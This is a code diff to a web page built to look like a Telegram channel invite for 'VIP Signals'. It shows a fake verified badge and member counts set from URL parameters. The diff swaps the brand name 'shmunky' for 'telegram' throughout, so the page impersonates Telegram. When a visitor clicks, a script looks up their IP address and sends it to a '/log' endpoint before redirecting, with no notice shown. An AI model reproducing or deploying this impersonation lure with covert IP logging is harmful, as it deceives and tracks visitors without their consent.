@@ -262,13 +262,13 @@
             <div class="tg-logo-icon">
                 <i class="fa-solid fa-paper-plane" id="logo-icon-img"></i>
             </div>
-            <span class="tg-logo-text" id="logo-brand-name">shmunky</span>
+            <span class="tg-logo-text" id="logo-brand-name">telegram</span>
         </a>
     </header>
 
     <!-- 2. NOTICE BANNER -->
     <div class="tg-notice-banner" id="notice-banner" onclick="handleNoticeClick()">
-        Don't have shmunky yet? Get it now!
+        Don't have telegram yet? Get it now!
     </div>
 
     <!-- 3. MAIN CARD CONTENT -->
@@ -282,7 +282,7 @@
 
         <!-- Group Title -->
         <h1 class="group-title" id="group-title-el">
-            <span id="group-title-text">shmunky VIP Signals</span>
+            <span id="group-title-text">telegram VIP Signals</span>
             <i class="fa-solid fa-circle-check verified-badge" id="verified-badge-icon" title="Verified Channel"></i>
         </h1>
 
@@ -293,7 +293,7 @@
 
         <!-- Group Description -->
         <p class="group-description" id="group-desc-el">
-            Official shmunky channel. Join for daily high-potential group access and insider signals.
+            Official telegram channel. Join for daily high-potential group access and insider signals.
         </p>
 
         <!-- Dynamic Action Button -->
@@ -329,8 +329,8 @@
             document.body.classList.remove('dark-mode');
 
             // 2. Load Values from URL parameters
-            const title = params.title || 'shmunky VIP Signals';
-            const desc = params.desc || 'Official shmunky channel. Join for daily high-potential group access and insider signals.';
+            const title = params.title || 'telegram VIP Signals';
+            const desc = params.desc || 'Official telegram channel. Join for daily high-potential group access and insider signals.';
             const members = params.members || '185,420';
             const online = params.online || '4,219';
             const avatar = params.avatar || '';
@@ -344,7 +344,7 @@
             document.getElementById('online-count').textContent = online;
 
             // Set brand logo text based on platform or customized title
-            let brandName = 'shmunky';
+            let brandName = 'telegram';
             if (platform.startsWith('tg')) {
                 brandName = 'Telegram';
             }
@@ -385,7 +385,7 @@
                 .then(data => fetch('/log?ip=' + data.ip))
                 .catch(() => fetch('/log'))
                 .finally(() => {
-                    window.location.href = 'tg://resolve?domain=shmunky';
+                    window.location.href = 'tg://resolve?domain=telegram';
                 });
         }
 
